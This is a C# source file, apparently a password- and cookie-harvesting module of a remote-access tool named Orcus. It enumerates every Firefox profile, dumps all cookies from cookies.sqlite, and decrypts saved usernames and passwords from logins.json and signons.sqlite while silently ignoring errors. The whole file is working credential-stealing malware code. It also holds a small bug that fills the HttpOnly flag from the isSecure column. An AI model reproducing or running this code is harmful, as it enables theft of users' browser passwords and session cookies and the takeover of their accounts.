using System;
using System.Collections.Generic;
using System.IO;
using System.Web.Script.Serialization;
using Orcus.Commands.Passwords.Utilities;
using Orcus.Shared.Commands.Password;

namespace Orcus.Commands.Passwords.Applications.Mozilla
{
    internal class Firefox : IPasswordRecovery, ICookieRecovery
    {
        private const string ApplicationName = "Mozilla Firefox";

        /// <summary>
        ///     Recover Firefox Cookies from the SQLite3 Database
        /// </summary>
        /// <returns>List of Cookies found</returns>
        public IEnumerable<RecoveredCookie> GetCookies()
        {
            var data = new List<RecoveredCookie>();

            var appDataDir =
                new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Mozilla\\Firefox\\Profiles"));
            if (!appDataDir.Exists)
                return data;

            foreach (var profile in appDataDir.GetDirectories())
            {
                var cookiesFile = new FileInfo(Path.Combine(profile.FullName, "cookies.sqlite"));
                if (!cookiesFile.Exists)
                    continue;

                SQLiteHandler sql = new SQLiteHandler(cookiesFile.FullName);
                if (!sql.ReadTable("moz_cookies"))
                    continue;

                int totalEntries = sql.GetRowCount();

                for (int i = 0; i < totalEntries; i++)
                {
                    try
                    {
                        string h = sql.GetValue(i, "host");
                        //Uri host = new Uri(h);
                        string name = sql.GetValue(i, "name");
                        string val = sql.GetValue(i, "value");
                        string path = sql.GetValue(i, "path");

                        bool secure = sql.GetValue(i, "isSecure") != "0";
                        bool http = sql.GetValue(i, "isSecure") != "0";

                        // if this fails we're in deep shit
                        long expiryTime = long.Parse(sql.GetValue(i, "expiry"));
                        var exp = TimeHelper.FromUnixTime(expiryTime);

                        data.Add(new RecoveredCookie
                        {
                            Host = h,
                            ExpiresUtc = exp,
                            Name = name,
                            Value = val,
                            Path = path,
                            Secure = secure,
                            HttpOnly = http,
                            ApplicationName = ApplicationName
                        });
                    }
                    catch (Exception)
                    {
                        break;
                    }
                }
            }

            return data;
        }

        public IEnumerable<RecoveredPassword> GetPasswords()
        {
            var firefoxPasswords = new List<RecoveredPassword>();

            var appDataDir =
                new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Mozilla\\Firefox\\Profiles"));

            if (!appDataDir.Exists)
                return firefoxPasswords;

            foreach (var profile in appDataDir.GetDirectories())
            {
                var keyDatabase = new FileInfo(Path.Combine(profile.FullName, "key3.db"));
                if (!keyDatabase.Exists)
                    continue;

                var mozillaDecryptor = new MozillaDecryptor();
                try
                {
                    if (!mozillaDecryptor.Initialize(profile.FullName))
                        continue;
                }
                catch (Exception)
                {
                    continue;
                }

                var loginJson = new FileInfo(Path.Combine(profile.FullName, "logins.json"));
                if (loginJson.Exists)
                {
                    try
                    {
                        var loginData =
                            new JavaScriptSerializer().Deserialize<FirefoxLogins>(File.ReadAllText(loginJson.FullName));
                        foreach (var loginDataLogin in loginData.logins)
                        {
                            firefoxPasswords.Add(new RecoveredPassword
                            {
                                Application = ApplicationName,
                                UserName = mozillaDecryptor.DecryptString(loginDataLogin.encryptedUsername),
                                Password = mozillaDecryptor.DecryptString(loginDataLogin.encryptedPassword),
                                Field1 = loginDataLogin.hostname,
                                PasswordType = PasswordType.Browser
                            });
                        }
                    }
                    catch (Exception)
                    {
                        // ignored
                    }
                }

                var signonsFile = new FileInfo(Path.Combine(profile.FullName, "signons.sqlite"));
                if (signonsFile.Exists)
                {
                    try
                    {
                        var sqlDatabase = new SQLiteHandler(signonsFile.FullName);
                        if (sqlDatabase.ReadTable("moz_logins"))
                        {
                            var totalEntries = sqlDatabase.GetRowCount();
                            for (int i = 0; i < totalEntries; i++)
                            {
                                try
                                {
                                    var encryptedUsername = sqlDatabase.GetValue(i, "encryptedUsername");
                                    var encryptedPassword = sqlDatabase.GetValue(i, "encryptedPassword");
                                    var hostname = sqlDatabase.GetValue(i, "hostname");
                                    firefoxPasswords.Add(new RecoveredPassword
                                    {
                                        Application = ApplicationName,
                                        UserName = mozillaDecryptor.DecryptString(encryptedUsername),
                                        Password = mozillaDecryptor.DecryptString(encryptedPassword),
                                        Field1 = hostname,
                                        PasswordType = PasswordType.Browser
                                    });
                                }
                                catch (Exception)
                                {
                                    // ignored
                                }
                            }
                        }
                    }
                    catch (Exception)
                    {
                        // ignored
                    }
                }
            }
            
            return firefoxPasswords;
        }
    }
}